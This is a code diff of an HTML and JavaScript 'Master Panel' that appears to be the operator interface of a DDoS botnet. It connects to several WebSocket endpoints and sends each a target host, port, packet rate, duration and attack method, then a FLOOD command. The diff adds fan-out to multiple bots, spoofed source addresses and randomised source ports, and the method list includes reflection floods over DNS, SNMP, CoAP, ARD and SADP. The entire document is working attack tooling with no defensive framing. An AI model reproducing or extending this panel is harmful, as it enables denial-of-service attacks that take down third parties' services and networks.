@@ -5,77 +5,101 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1.0">
 	<title>Master Panel</title>
 	<script>
-	let socket;
-	let iscon=false;
-
 
 	function sleepb(ms) {
 		const start = Date.now();
 		while (Date.now() - start < ms);
 	}
+
+	let sockets = new Map();
+	let iscond=false;
+	
 	function connect() {
-      		const url = document.getElementById("wsurl").value;
-
-		socket = new WebSocket(url);
-		socket.onopen = () => {
-			console.log("OPEN");
-			iscon=true;
-			updateConnectionStatus();
-		};
-		socket.onclose = () => {
-			console.log("OPEN");
-			iscon=false;
-			updateConnectionStatus();
-		};
-		socket.onerror = (error) => {
-			console.log("OPEN");
-			iscon=false;
-			updateConnectionStatus();
-		};
-
-	}
-	function stopcmd() {
-		const command = "ABORT\r\n";
-		if (socket && socket.readyState === WebSocket.OPEN) {
-			sleepb(100);
-			socket.send(command);
-			console.log("SEND  ", command);
-		} else {
-			console.log("ERROR SEND");
-		}
-	}
-
-	function sendcmd() {
-		const host = document.getElementById("host").value.trim();
-		const port = document.getElementById("port").value.trim();
-		const time = document.getElementById("time").value.trim();
-		const pps = document.getElementById("pps").value.trim();
-		const method = document.getElementById("method").value;
-
-		if (!host || !port || !time || !pps || !method) {
-			console.log("All fields!");
+		const url = document.getElementById("wsurl").value.trim();
+		if (!url||sockets.has(url)) {
+			alert("Invalid URL or it is already connected.");
 			return;
 		}
 
-		const commands = [
-			`HOST ${host}\r\n`, 
-			`PORT ${port}\r\n`, 
-			`TIME ${time}\r\n`, 
-			`PPS ${pps}\r\n`, 
-			`METHOD ${method}\r\n`,
-			`FLOOD\r\n`
-		];
+		const socket = new WebSocket(url);
 
-		if (socket && socket.readyState === WebSocket.OPEN) {
-			commands.forEach(command => {
-			socket.send(command);
-			sleepb(100);
-			console.log("SEND  ", command);
-		});
-		} else {
-			console.log("ERROR SEND");
-		}
+		socket.onopen = () => {
+			sockets.set(url, socket);
+			iscon=1;
+			updateConnectionList();
+			updateConnectionStatus();
+		};
+
+		socket.onclose = () => {
+			sockets.delete(url);
+			updateConnectionList();
+			updateConnectionStatus();
+			iscon=0;
+		};
+
+		socket.onerror = (err) => {
+			socket.close();
+			iscon=0;
+		};
 	}
+	function sendabort() {
+		const command = "ABORT\r\n";
+		sockets.forEach((socket, url) => {
+			if (socket.readyState === WebSocket.OPEN) {
+				socket.send(command);
+				sleepb(100);
+			}
+		});
+	}
+
+	function sendcmd() {
+ 		const host = document.getElementById("host").value.trim();
+                const port = document.getElementById("port").value.trim();
+                const time = document.getElementById("time").value.trim();
+                const pps = document.getElementById("pps").value.trim();
+                const method = document.getElementById("method").value;
+                const unlimit = document.getElementById("unlimit").value;
+                const source = document.getElementById("source").value;
+                const random = document.getElementById("random").value;
+                const srcport = document.getElementById("srcport").value;
+
+		const command = `SET ${host} ${port} ${method} ${unlimit} ${source} ${pps} ${time} NULL ${random} ${srcport} 0\r\n`;
+
+		sockets.forEach((socket, url) => {
+			if (socket.readyState === WebSocket.OPEN) {
+				socket.send(command);
+				sleepb(100);
+			}
+		});
+		const flood="FLOOD\r\n"
+		sockets.forEach((socket, url) => {
+			if (socket.readyState === WebSocket.OPEN) {
+				socket.send(flood);
+				sleepb(100);
+			}
+		});
+	}
+
+	function updateConnectionList() {
+		const list = document.getElementById("connections");
+		list.innerHTML = "";
+
+		sockets.forEach((socket, url) => {
+			const li = document.createElement("p");
+			li.textContent = url;
+
+			const btn = document.createElement("button");
+			btn.textContent = "Disconnect";
+			btn.style.marginLeft = "15px";
+			btn.onclick = () => {
+				socket.close();
+			};
+
+			li.appendChild(btn);
+			list.appendChild(li);
+		});
+	}
+
 	function updateConnectionStatus() {
 		const statusElement = document.getElementById("connection-status");
 		if (iscon) {
@@ -148,6 +172,12 @@
 		text-decoration:	underline;
 		color:			var(--link-color);
 	}
+	p {
+		text-decoration:	underline;
+		margin-top: 10px;
+		margin-left: 10px;
+		color:	magenta;
+	}
 
 
 	header {
@@ -158,12 +188,18 @@
 
 
 	.container {
-		max-width:		500px;
-		margin-left:		auto;
-		margin-right:		auto;
-		padding-top:		6rem;
-		padding-bottom:		6rem;
-		min-height:		30vh;
+		max-width: 500px;
+		min-height: 30vh;
+		padding-top: 6rem;
+		padding-bottom: 6rem;
+	}
+	.concontainer {
+		background:		Black;
+		min-width:500px;
+		min-height:260px;
+		border:		solid gray 1px;
+		margin-top: 100px;
+		padding-bottom: 6rem;
 	}
 
 
@@ -228,6 +264,13 @@
 		text-decoration:	underline;
 		transition:		color 0.2s;
 	}
+	.wrapper {
+		display: flex;
+		justify-content: center;
+		align-items: flex-start;
+		gap: 1rem;
+	}
+
 	input:hover {
 		color:			Red;
 		font-weight:		bold;
@@ -278,6 +321,10 @@
 
 	<header>
 	</header>
+	<div class="wrapper">
+	<div class="concontainer">
+		<ul id="connections"></ul>
+	</div>
 	<div class="container">
 		<div id="connection-status" style="font-size: 20px; font-weight: bold;">
 			Check connetion
@@ -295,7 +342,6 @@
 		<hr>
 		<br>
 		<div id="log-entries">
-
 			<div id="ipd" class="log-entry">
 				<span id="hostSpan">
 					<span class="type">
@@ -303,6 +349,15 @@
 					</span>
 				</span>
 				<input type="text" id="host">
+			</div>
+
+			<div id="ipd" class="log-entry">
+				<span id="hostSpan">
+					<span class="type">
+						<label for="unlimit">unlimit (max speed)</label>
+					</span>
+				</span>
+				<input value="1" type="text" id="unlimit">
 			</div>
 
 			<div id="ipd" class="log-entry">
@@ -332,6 +387,33 @@
 				<input value="500" type="text" id="pps">
 			</div>
 
+			<div id="ipd" class="log-entry">
+				<span id="hostSpan">
+					<span class="type">
+						<label for="source">source (ipv4)</label>
+					</span>
+				</span>
+				<input value="NULL" type="text" id="source">
+			</div>
+
+			<div id="ipd" class="log-entry">
+				<span id="hostSpan">
+					<span class="type">
+						<label for="random">random mehod</label>
+					</span>
+				</span>
+				<input value="NULL" type="text" id="random">
+			</div>
+
+			<div id="ipd" class="log-entry">
+				<span id="hostSpan">
+					<span class="type">
+						<label for="srcport">source port</label>
+					</span>
+				</span>
+				<input value="ARAND" type="text" id="srcport">
+			</div>
+
 
 			<br>
 			<br>
@@ -345,19 +427,18 @@
 					<option value="">-- SELECTED --</option>
 					<option value="0">esp</option>
 					<option value="1">icmp echo</option>
-					<option value="2">ip empty</option>
-					<option value="3">tcp syn</option>
-					<option value="4">tcp tfo</option>
-					<option value="5">udp coapv2</option>
-					<option value="6">udp default</option>
-					<option value="7">udp dns</option>
-					<option value="8">udp snmp</option>
+					<option value="2">tcp syn</option>
+					<option value="3">ip empty</option>
+					<option value="4">udp dns</option>
+					<option value="5">tcp tfo</option>
+					<option value="6">udp discord</option>
+					<option value="7">udp snmp</option>
+					<option value="8">udp default</option>
 					<option value="9">udp echo</option>
-					<option value="10">udp dvr</option>
-					<option value="11">udp sadp</option>
-					<option value="12">udp ard</option>
-					<option value="13">tcp http</option>
-					<option value="14">udp discord</option>
+					<option value="10">udp ard</option>
+					<option value="11">udp dvr</option>
+					<option value="12">udp sadp</option>
+					<option value="13">udp coapv2</option>
 				</select>
 				</div>
 				<br>
@@ -366,10 +447,12 @@
 				<br>
 				<br>
 				<button onclick="sendcmd()">FLOOD</button>
-				<button onclick="stopcmd()">STOP</button>
+				<button onclick="sendabort()">STOP</button>
 				<button onclick="connect()">CONNECT</button>
 			</div>
 		</div>
+	</div>
+
 	</div>
 
 	<footer>
